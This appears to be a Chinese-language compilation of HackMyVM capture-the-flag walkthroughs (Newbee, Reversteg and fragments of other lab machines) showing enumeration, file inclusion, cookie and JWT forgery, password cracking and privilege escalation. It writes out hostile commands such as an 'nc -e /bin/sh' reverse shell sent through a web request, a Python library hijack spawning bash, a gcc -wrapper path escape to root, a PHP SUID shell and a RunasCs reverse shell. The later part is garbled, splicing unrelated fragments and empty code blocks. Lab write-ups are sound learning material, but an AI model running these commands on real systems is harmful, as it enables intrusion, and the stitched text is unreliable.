title: HMV-Newbee靶机渗透记录
content:
# 信息搜集 mac地址为`00:0C:29:15:F1:A2`得到ip地址为`` ```plain ┌──(root㉿kali-plus)-[/] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:1d:89:b5, IPv4: Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 3c:06:a7:fa:49:88 TP-LINK TECHNOLOGIES CO.,LTD. e0:2e:0b:94:50:57 Intel Corporate 00:0c:29:15:f1:a2 VMware, Inc. 60:e3:2b:ab:61:39 Intel Corporate 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 4 responded ┌──(root㉿kali-plus)-[/] └─# nmap -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 00:09 CST Nmap scan report for bogon () Host is up (0.00064s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 00:0C:29:15:F1:A2 (VMware) Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds ``` 使用gobuster对目录进行扫描 ```plain ┌──(root㉿kali-plus)-[/] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http:/// -x.txt,.php,.zip =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http:/// [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,zip [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /index.php (Status: 200) [Size: 18852] /contact.php (Status: 200) [Size: 8853] /about.php (Status: 200) [Size: 10036] /blog.php (Status: 200) [Size: 9782] /products.php (Status: 200) [Size: 12163] /terms.php (Status: 200) [Size: 6670] /assets (Status: 301) [Size: 315] [--> http:///assets/] /testimonials.php (Status: 200) [Size: 7907] /javascript (Status: 301) [Size: 319] [--> http:///javascript/] /checkout.php (Status: 200) [Size: 13307] /secret.php (Status: 200) [Size: 2187] /.php (Status: 403) [Size: 278] /server-status (Status: 403) [Size: 278] Progress: 882236 / 882240 (100.00%) =============================================================== Finished =============================================================== ``` ## 获取 User Flag 发现``可以执行命令，但是权限不够，再从其他路子找入口，用wfuzz模糊测试一下是否可以任意文件读取 ```plain ┌──(root㉿kali-plus)-[/] └─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http:///?FUZZ=../../../../../../etc/passwd --hh 18851 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http:///?FUZZ=../../../../../../etc/passwd Total requests: 4744 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000002049: 200 376 L 1270 W 18863 Ch "hack" Total time: 0 Processed Requests: 4744 Filtered Requests: 4743 Requests/sec.: 0 ``` 发现是可以读取的，但是直接读好像读不了，试试php伪协议 ```plain  ``` 成功读取到了secret.php的内容，给他解密一下 ```php 命令行控制台
\> ' . htmlspecialchars($command) . '
'; echo '
' . nl2br(htmlspecialchars($output)) . '
'; } } else { echo '
No permission to execute commands, lacking admin permission.
'; } ?>
\>
``` 可以看到php代码有一个检测就是要设置cookie为AreYouAdmin并且值为Yes，抓包修改一下 ```php GET /secret.php?command=nc+-e+/bin/sh++1234 HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36 Cookie: AreYouAdmin=Yes Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http:///secret.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ``` 然后就能拿到一个shell了 ```php sudo -l Matching Defaults entries for www-data on Newbee: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw, use_pty User www-data may run the following commands on Newbee: (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py cat /var/www/html/vuln.py import random import time import math import string import datetime def generate_random_string(length=10): return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) def pointless_computation(): number = random.randint(1, 1000) result = math.sqrt(number) * math.log(number) print(f"Calculated math nonsense: sqrt({number}) * log({number}) = {result}") def simulate_time_wasting(): now = datetime.datetime.now() print(f"Started wasting time at {now}") time.sleep(2) # 故意睡眠 2 秒 later = datetime.datetime.now() print(f"Finished wasting time at {later}. Time wasted: {later - now}") def pointless_string_operations(): rand_str = generate_random_string() print(f"Generated random string: {rand_str}") reversed_str = rand_str[::-1] print(f"Reversed string: {reversed_str}") print(f"String length: {len(rand_str)}") if __name__ == "__main__": pointless_computation() simulate_time_wasting() pointless_string_operations() print("All done. The script accomplished nothing useful.") ``` 接着就是在找到了这个文件，这个文件就是导入了一些库，导入库的时候首先是在当前目录找库文件，可以在当前目录写一个库文件，内容是``，这样使用其他用户运行这个脚本的时候，导入库文件就是先导入我们写的这个假文件，进行一个库文件的劫持，然后就能拿到指定用户的shell ```plain sudo -l Matching Defaults entries for www-data on Newbee: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw, use_pty User www-data may run the following commands on Newbee: (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py cd /var/www/html ls flask shop vuln.py echo 'import os;os.system("/bin/bash")' > random.py sudo -u debian /usr/bin/python3 /var/www/html/vuln.py id uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev) ``` 这样就能拿到debian用户的shell，然后拿到user flag ```plain ls config.php note.txt user.txt cat user.txt cat note.txt Damn it, I forgot my database password heard that Debian is currently building a message board, maybe he can help me ``` ## 提权 这里也得到一个提示，然后还有一个.secret文件夹，这个文件夹下面也有一个提示 ```plain cat hint.txt password md5(key) and key is in mysql!!!!!! ``` 提示口令已脱敏 ```plain ss -lntup Netid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess udp UNCONN 0 0 :68 :* tcp LISTEN 0 128 :5000 :* tcp LISTEN 0 80 :3306 :* tcp LISTEN 0 128 :22 :* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 511 *:80 *:* ``` 发现本地开了一个5000端口，我们需要使用socat把端口转发出去，这个靶机是有socat的，使用tldr找一个命令然后转发就好了 ```plain socat TCP-LISTEN:8000,fork TCP4::5000 ss -lntup Netid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess udp UNCONN 0 0 :68 :* tcp LISTEN 0 128 :5000 :* tcp LISTEN 0 5 :8000 :* users:(("socat",pid=2160,fd=5)) tcp LISTEN 0 80 :3306 :* tcp LISTEN 0 128 :22 :* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 511 *:80 *:* ``` 可以看到已经成功转发出去了，然后访问ip:8000，然后需要登录，这个随便输入什么登录一下就行，这个是使用jwt来验证你是否为admin的，可以使用john先爆破一下密码 ┌──(root㉿kali-plus)-[~] └─# john tmp --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash [password key, SHA256 256/256 AVX2 8x]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status noob (?) 1g 0:00:00:00 DONE (2025-03-30 23:25) 1.449g/s 7313Kp/s 7313Kc/s 7313KC/s normaluz,2604...nmloera! Use the "--show" option to display all of the cracked passwords reliably Session completed. ``` 得到密钥是noob，接下来去伪造一个jwt，使用jwt_tool这个工具，地址为：[https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) ```plain ┌──(root㉿kali-plus)-[~/jwt_tool] └─# cat setup.txt git clone https://github.com/ticarpi/jwt_tool cd jwt_tool sudo apt install python3-pip python3 -m pip install termcolor cprint pycryptodomex requests chmod +x jwt_tool.py ┌──(root㉿kali-plus)-[~/jwt_tool] └─# python3 -m pip install termcolor cprint pycryptodomex requests Requirement already satisfied: termcolor in /usr/lib/python3/dist-packages (2.4.0) Requirement already satisfied: cprint in /usr/local/lib/python3.11/dist-packages (1.2.2) Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (3.11.0) Requirement already satisfied: requests in /usr/lib/python3/dist-packages (2.31.0) WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning. ┌──(root㉿kali-plus)-[~/jwt_tool] └─# python3 -m pip install termcolor cprint pycryptodomex requests --root-user-action Usage: /usr/bin/python3 -m pip install [options] [package-index-options] ... /usr/bin/python3 -m pip install [options] -r [package-index-options] ... /usr/bin/python3 -m pip install [options] [-e] ... /usr/bin/python3 -m pip install [options] [-e] ... /usr/bin/python3 -m pip install [options] ... --root-user-action option requires 1 argument ┌──(root㉿kali-plus)-[~/jwt_tool] └─# python3 jwt_tool.py -T -S hs256 -p noob eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhZCIsImV4cCI6MTc0MzM1MTcxN30.6I8qsnUorIfYfPHxF09yD3KLcFVirHHw0rHz9yIz2Ms \ \ \ \ \ \ \__ | | \ |\__ __| \__ __| | | | \ | | | \ \ | | \ | | | __ \ __ \ | \ | _ | | | | | | | | | | / \ | | | | | | | | \ | / \ | | |\ |\ | | \______/ \__/ \__| \__| \__| \______/ \______/ \__| Version 2.2.7 \______| @ticarpi Original JWT: ==================================================================== This option allows you to tamper with the header, contents and signature of the JWT. ==================================================================== Token header values: [1] alg = "HS256" [2] typ = "JWT" [3] *ADD A VALUE* [4] *DELETE A VALUE* [0] Continue to next step Please select a field number: (or 0 to Continue) > 0 Token payload values: [1] username = "aad" [2] exp = 1743351717 ==> TIMESTAMP = 2025-03-31 00:21:57 (UTC) [3] *ADD A VALUE* [4] *DELETE A VALUE* [5] *UPDATE TIMESTAMPS* [0] Continue to next step Please select a field number: (or 0 to Continue) > 1 Current value of username is: aad Please enter new value and hit ENTER > admin [1] username = "admin" [2] exp = 1743351717 ==> TIMESTAMP = 2025-03-31 00:21:57 (UTC) [3] *ADD A VALUE* [4] *DELETE A VALUE* [5] *UPDATE TIMESTAMPS* [0] Continue to next step Please select a field number: (or 0 to Continue) > 0 jwttool_d6329eb7a09f667401ace111e474bb4f - Tampered token - HMAC Signing: [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQzMzUxNzE3fQ.WcYe5TS2RTGyy7rrpnb6Ja03VD7QKhfjTv2Rkcsj_Jo ``` ```html HTTP/1.1 200 OK Server: Werkzeug/3.1.3 Python/3.11.2 Date: Sun, 30 Mar 2025 15:43:15 GMT Content-Type: text/html; charset=utf-8 Content-Length: 2302 Connection: close Message Board
Logout (admin)

Message Board

admin

Welcome to the secure message board!

admin

Mysql account: root:TheStrongestPassword

user1

I think this is a great project!

user2

Hello everyone! Nice to be here.

``` 然后把jwt换掉就好了，得到数据库的密码`TheStrongestPassword www-data@Newbee:/var/www/html/shop$ mysql -u root -p mysql -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 8 Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. MariaDB [(none)]> show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | user | +--------------------+ 5 rows in set (0.001 sec) MariaDB [(none)]> use user; use user; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [user]> show tables; show tables; +----------------+ | Tables_in_user | +----------------+ | user | +----------------+ 1 row in set (0.001 sec) MariaDB [user]> select * from user; select * from user; +----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+ | id | username | passwd | salt | passwd_hash_algo | +----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+ | 1 | debian | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60 | +----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+ 1 row in set (0.123 sec) ``` 然后扔给ai跑出一个爆破脚本，爆破出来的口令已脱敏1qaz2wsx`，然后根据前面的提示，口令已脱敏 ```html ┌──(root㉿kali-plus)-[~] └─# echo -n '1qaz2wsx' |md5sum ``` 这个得到的是压缩包的密码，然后解压一下压缩包，得到password 图片原本的内容是`Hello from the other side`，这个应该就是root的密码，发现不对，改成小写试试`hello from the other side`，还是不对，应该没有空格，`hellofromtheotherside` ```html debian@Newbee:/tmp$ su - root su - root Password: root@Newbee:~# id id uid=0(root) gid=0(root) groups=0(root) root@Newbee:~# ls ls root.txt root@Newbee:~# cat root.txt cat root.txt ```

title: HMV-Reversteg靶机渗透记录
content:

扫出来80和22，先看看80，80端口就是一个apache服务，扫一下目录但是啥也没得到，看源码看到最下面有一个提示
`<!-- Some people always don't understand the format of photos. -->` 和图片有关，在源码里还找到`<!-- 117db0148dc179a2c2245c5a30e63ab0 -->` 加一个.jpg就能得到一只猫的图片，加上.png又能得到一张一只猫的图片，把他们都下载下来，既然是图片，看看能不能用binwalk分离出来什么，分离出来的东西貌似没什么用，看看图片的exif信息

jpg图片后面有个base64但是没什么用，线索应该就是在这2张图片里，但是没什么思路了，看了一下wp，使用zsteg这个工具一把梭能得到一个密码

```
gem sources -l   //查看现有yuan
gem sources --remove https://rubygems.org/   //删除现有源
gem sources -a http://gems.ruby-china.com/    //添加新源
apt-get install gem
gem install zsteg
```
直接一把梭
```bash
┌──(root㉿kali-plus)-[~/reversteg]
└─# zsteg 117db0148dc179a2c2245c5a30e63ab0.png

b2,g,lsb,xy         .. text: "E@UAUUUUUUUUj"
b2,g,msb,xy         .. text: "UUUZs-VUU"
b2,b,lsb,xy         .. text: "EUUUUUUUUV"
b2,b,msb,xy         .. text: "_UUUoUUe"
b3,b,msb,xy         .. file: MPEG ADTS, layer I, v2,  96 kbps, Stereo
b3,rgb,lsb,xy       .. file: PGP Secret Sub-key -
b4,r,lsb,xy         .. text: "DEUTfgww"
b4,r,msb,xy         .. text: "M,\"\"\"\"\"\""
b4,g,lsb,xy         .. text: ["\"" repeated 10 times]
b4,g,msb,xy         .. text: "HDDDDDDDDDDH"
b4,b,lsb,xy         .. text: "3\"##2\"\"#33333333333333334DDDDDDDDDD4C333\"\"\""
b4,b,msb,xy         .. text: ",\"\"\"\"\"\"\"\"\"\","
```
得到的`morainelake` 应该是一个密码，下面要使用steghide这个工具来解密jpg图片，口令已脱敏，解出来一个压缩包
```bash
┌──(root㉿kali-plus)-[~/reversteg]
└─# steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg
Enter passphrase: 
wrote extracted data to "secret.zip".
```
## 获取 User Flag
压缩包有密码，使用刚刚得到的口令已脱敏，得到secret.txt，里面是用户名和密码

┌──(root㉿kali-plus)-[~/reversteg/secret]
└─# cat secret.txt        
morainelake:660930334
```
直接ssh连上去之后发现一个note.txt
```bash
morainelake@reversteg:~$ ls
history  note.txt
morainelake@reversteg:~$ cat note.txt
morainelake is a very careless user with a very bad memory. He always throws things aside after organizing them. This time he accidentally lost the flag. Fortunately, the administrator has the historical records, but there are too many records to find the corresponding correct flag. Can you find it correctly?
"Don't worry about failures; worry about the chances you miss when you don't even try. After all, it's better to look back and say, 'I can't believe I did that,' than to look back and say, 'What if?' (You'll probably fail anyway.)"
```
在同一级目录下有一个history文件，cat发现是很多flag，再次cat发现2次的flag不一样，要找到真正的flag有以下几种方式
### 方法一
```bash
cat history > a
cat history > b
morainelake@reversteg:~$ grep -f a b
<flag>
```
### 方法二
```bash
morainelake@reversteg:~$ cat a b |awk 'a[$1]++'
<flag>
```
### 方法三
```bash
morainelake@reversteg:~$ cat a b |sort|uniq -c|sort -n
      ..............
      1 <flag>
      1 <flag>
      1 <flag>
      1 <flag>
      1 <flag>
      2 <flag>
```
## 提权
出现2次的就是真正的flag了，在/opt目录下有一个reverse，下载到本地使用ida分析一下
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[28]; // [rsp+9h] [rbp-E7h] BYREF
  __int128 v5; // [rsp+25h] [rbp-CBh] BYREF
  char v6[7]; // [rsp+35h] [rbp-BBh] BYREF
  int v7; // [rsp+3Ch] [rbp-B4h] BYREF
  int v8; // [rsp+40h] [rbp-B0h] BYREF
  int v9; // [rsp+60h] [rbp-90h] BYREF
  int v10[8]; // [rsp+80h] [rbp-70h] BYREF
  char dest[24]; // [rsp+A0h] [rbp-50h] BYREF
  void *ptr; // [rsp+B8h] [rbp-38h]
  int v13; // [rsp+C0h] [rbp-30h]
  char v14; // [rsp+C7h] [rbp-29h]
  char *v15; // [rsp+C8h] [rbp-28h]
  char *v16; // [rsp+D0h] [rbp-20h]
  void *v17; // [rsp+D8h] [rbp-18h]
  void *v18; // [rsp+E0h] [rbp-10h]
  char v19; // [rsp+EBh] [rbp-5h]
  int v20; // [rsp+ECh] [rbp-4h]

  puts("Enter password <REDACTED_PASSWORD> Enter H coward mode:");
  v20 = 0;
  while ( 1 )
  {
    __isoc99_scanf("%s", &v4[7]);
    if ( strcmp(&v4[7], "H") )
      break;
    if ( ++v20 == 100 )
    {
      puts("Hint: Invert XOR Replace! ");
      goto LABEL_6;
    }
  }
  strcpy(dest, &v4[7]);
  __isoc99_scanf("%s %s %s", v10, &v9, &v8);
LABEL_6:
  v7 = '},9';
  strcpy(v6, "/, 8:(");
  strcpy(&v5 + 7, "!!|}yx{z");
  strcpy(&v5, "(;$)(#");
  v19 = 'M';
  v18 = xor_decrypt(&v5 + 7, 'M');
  v17 = xor_decrypt(v6, v19);
  v16 = xor_decrypt(&v7, v19);
  v15 = xor_decrypt(&v5, v19);
  if ( check_password <REDACTED_PASSWORD> &v9, &v8, v18, v17, v16, v15) )
  {
    strcpy(v4, "pvygob");
    v14 = 106;
    v13 = 10;
    ptr = caesar_decrypt(v4, 10LL);
    printf("[+] Enter the password <REDACTED_PASSWORD> you know: %s\n", ptr);
    free(ptr);
  }
  else
  {
    puts("[-] Incorrect password
  <REDACTED_PASSWORD>
  free(v18);
  free(v17);
  free(v16);
  free(v15);
  return 0;
}
```
其中需要解密
```plain
},9    //ta0
8:(    //bamuwe
!!|}yx{z   //ll104567
(;$)(#     //eviden
pvygob     //flower
```
然后运行reverse依次输入`ll104567bamuweta0eviden`  
```bash
morainelake@reversteg:/opt$ ./reverse
Enter password <REDACTED_PASSWORD> Enter H coward mode:
ll104567
bamuwe
ta0
eviden
[+] Enter the password <REDACTED_PASSWORD> you know: flower
```
然后切换到welcome用户，口令已脱敏`ll104567bamuweta0eviden` 
```bash
morainelake@reversteg:/opt$ su - welcome
Password 
<REDACTED_PASSWORD> <REDACTED_PASSWORD>
welcome@reversteg:~$ ls
welcome@reversteg:~$ pwd
/home/welcome
welcome@reversteg:~$ ls
welcome@reversteg:~$ sudo -l
Matching Defaults entries for welcome on reversteg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on reversteg:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
welcome@reversteg:~$ sudo /usr/bin/gcc -wrapper /bin/sh,-s .
[sudo] password <REDACTED_PASSWORD> welcome: 
Sorry, user welcome is not allowed to execute '/usr/bin/gcc -wrapper /bin/sh,-s .' as root on reversteg.
welcome@reversteg:~$ sudo /usr/bin/gcc -wrapper /opt/../../../bin/sh,-s .
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
# bash
root@reversteg:/home/welcome# cd ..
root@reversteg:/home# cd ..
root@reversteg:/# cd root
root@reversteg:~# ls
banner.txt  history  root.txt
root@reversteg:~# cat root.txt
<root flag>
```
这里用到一个../../../逃逸，然后直接提权

El n�mero de serie del volumen es: 26CD-AE41 Directorio de c:\inetpub\wwwroot 30/01/2026 10:00 . 30/01/2026 10:00 .. 08/10/2023 22:22 03-comming-soon 30/01/2026 09:55 556 a.txt 08/10/2023 20:46 aspnet_client 08/10/2023 22:14 common-js 08/10/2023 22:14 fonts 08/10/2023 22:14 images 08/10/2023 22:26 1.481 index.html 30/01/2026 10:00 44.186 InsomniaShell.aspx 30/01/2026 09:54 4.259 shell.aspx 4 archivos 50.482 bytes 7 dirs bytes libres ``` 在这个目录发现了上传的文件，可以上传一个RunasCS.exe，地址：[RunasCS](https://github.com/antonioCoco/RunasCs) 这个工具可以反弹shell Usage: ```plain RunasCs v1.5 - @splinter_code Usage: RunasCs.exe username password [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation] Description: RunasCs is an utility to run specific processes under a different user account by specifying explicit credentials. In contrast to the default runas.exe command it supports different logon types and CreateProcess* functions to be used, depending on your current permissions. Furthermore it allows input/output redirection (even to remote hosts) and you can specify the password on the command line. Positional arguments: username username of the user password of the user cmd commandline for the process Optional arguments: -d, --domain domain domain of the user, if in a domain. Default: "" -f, --function create_process_function CreateProcess function to use. When not specified RunasCs determines an appropriate CreateProcess function automatically according to your privileges. 0 - CreateProcessAsUserW 1 - CreateProcessWithTokenW 2 - CreateProcessWithLogonW -l, --logon-type logon_type the logon type for the token of the new process. Default: "2" - Interactive -t, --timeout process_timeout the waiting time (in ms) for the created process. This will halt RunasCs until the spawned process ends and sent the output back to the caller. If you set 0 no output will be retrieved and a background process will be created. Default: "120000" -r, --remote host:port redirect stdin, stdout and stderr to a remote host. Using this option sets the process_timeout to 0. -p, --force-profile force the creation of the user profile on the machine. This will ensure the process will have the environment variables correctly set. WARNING: If non-existent, it creates the user profile directory in the C:\Users folder. -b, --bypass-uac try a UAC bypass to spawn a process without token limitations (not filtered). -i, --remote-impersonation spawn a new process and assign the token of the logged on user to the main thread. Examples: Run a command as a local user RunasCs.exe user1 password /c whoami /all" Run a command as a domain user and logon type as NetworkCleartext (8) RunasCs.exe user1 password /c whoami /all" -d domain -l 8 Run a background process as a local user, RunasCs.exe user1 password 4444 -e cmd.exe" -t 0 Redirect stdin, stdout and stderr of the specified command to a remote host RunasCs.exe user1 password -r :4444 Run a command simulating the /netonly flag of runas.exe RunasCs.exe user1 password /c whoami /all" -l 9 Run a command as an Administrator bypassing UAC RunasCs.exe adm1 password /c whoami /priv" --bypass-uac Run a command as an Administrator through remote impersonation RunasCs.exe adm1 password /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation ``` 用户名和口令已脱敏，先拿bogo用户的shell： ```bash c:\inetpub\wwwroot>RunasCs.exe bogo admin cmd -r :1234 RunasCs.exe bogo admin cmd -r :1234 [*] Warning: LoadUserProfile failed due to insufficient permissions [+] Running in session 0 with process function CreateProcessAsUserW() [+] Using Station\Desktop: Service-0x0-f8a65$\Default [+] Async process 'C:\Windows\system32\cmd.exe' with pid 92 created in background. ┌──(root㉿zss)-[/home/zss/桌面/hmv/simple] └─# nc -lvnp 1234 listening on [any] 1234 ... connect to [] from (UNKNOWN) [] 49715 Microsoft Windows [Versi�n 10.0.17763.107] (c) 2018 Microsoft Corporation. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 16:43 Scanning bogon () [1 port] Discovered open port 80/tcp on Completed SYN Stealth Scan at 16:43, 0.02s elapsed (1 total ports) Nmap scan report for bogon () Host is up, received arp-response (0.0011s latency). Scanned at 2025-04-21 16:43:56 CST for 0s PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 MAC Address: 08:00:27:41:D3:56 (Oracle VirtualBox virtual NIC) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds Raw packets sent: 2 (72B) | Rcvd: 2 (72B) ``` 貌似只开放了80端口，curl了一下是一个网页，有文件包含漏洞 ## 获取 User Flag ```html Quick Automative

``` 尝试远程包含kali上的reverse.php看看能不能反弹个shell，访问`` 即可反弹一个shell 先find看看有哪些可以使用的命令 ```shell www-data@quick:/home$ find / -perm -u=s -type f 2>/dev/null find / -perm -u=s -type f 2>/dev/null /snap/core20/1828/usr/bin/chfn /snap/core20/1828/usr/bin/chsh /snap/core20/1828/usr/bin/gpasswd /snap/core20/1828/usr/bin/mount /snap/core20/1828/usr/bin/newgrp /snap/core20/1828/usr/bin/passwd /snap/core20/1828/usr/bin/su /snap/core20/1828/usr/bin/sudo /snap/core20/1828/usr/bin/umount /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1828/usr/lib/openssh/ssh-keysign /snap/snapd/18357/usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/bin/at /usr/bin/sudo /usr/bin/umount /usr/bin/mount /usr/bin/chsh /usr/bin/su /usr/bin/chfn /usr/bin/gpasswd /usr/bin/php7.0 /usr/bin/newgrp /usr/bin/pkexec /usr/bin/passwd /usr/bin/fusermount ``` 发现php7.0可以用，直接查看一手`GTFObins` ```shell sudo install -m =xs $(which php) . CMD="/bin/sh" ./php -r "pcntl_exec('/bin/sh', ['-p']);" ``` 直接`` 即可拿到root权限了 然后直接去拿user 和 root flag ```shell cat user.txt ``` ## 提权 ```shell ```

title: HMV-OMG靶机渗透记录

# 信息搜集
首先这是一个windows的虚拟机，使用VMware导入，用VituralBox会报错，导入之后先确定ip地址，mac地址为`00:0C:29:E7:D5:95`使用`arp-scan`扫描得到ip地址为`<INTERNAL_IP>`，然后扫一下端口

```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap <INTERNAL_IP> -Pn

135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:E7:D5:95 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```

搜索了一下作者，发现作者有写博客[https://blog.orange.tw/](https://blog.orange.tw/)   在他的博客里看到一个CVE的版本号，猜测本靶机和这个CVE有关，使用msf搜索一波，msf好久没更新了，低版本搜不到这个CVE，更新一下即可

/root/.local/share/sqlmap/output//files/_etc_passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin _rpc:x:106:65534::/run/rpcbind:/usr/sbin/nologin statd:x:107:65534::/var/lib/nfs:/usr/sbin/nologin tftp:x:108:112:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin mysql:x:110:115:MySQL Require all denied AllowOverride None Require all granted Options -Indexes AllowOverride None Require all granted DocumentRoot /var/www/he110wor1d Options -Indexes AllowOverride None Require all granted SetHandler application/x-httpd-php ErrorLog ${APACHE_LOG_DIR}/xxx_error.log CustomLog ${APACHE_LOG_DIR}/xxx_access.log combined ``` 可以看到网站的一些源码都在``目录，然后可以去读取manager.php的内容 ```html ┌──(root㉿kali-plus)-[~] └─# cat /root/.local/share/sqlmap/output//files/_var_www_he110wor1d_littlesecrets_manager.php Manager Panel

Manager Panel

Command Output:

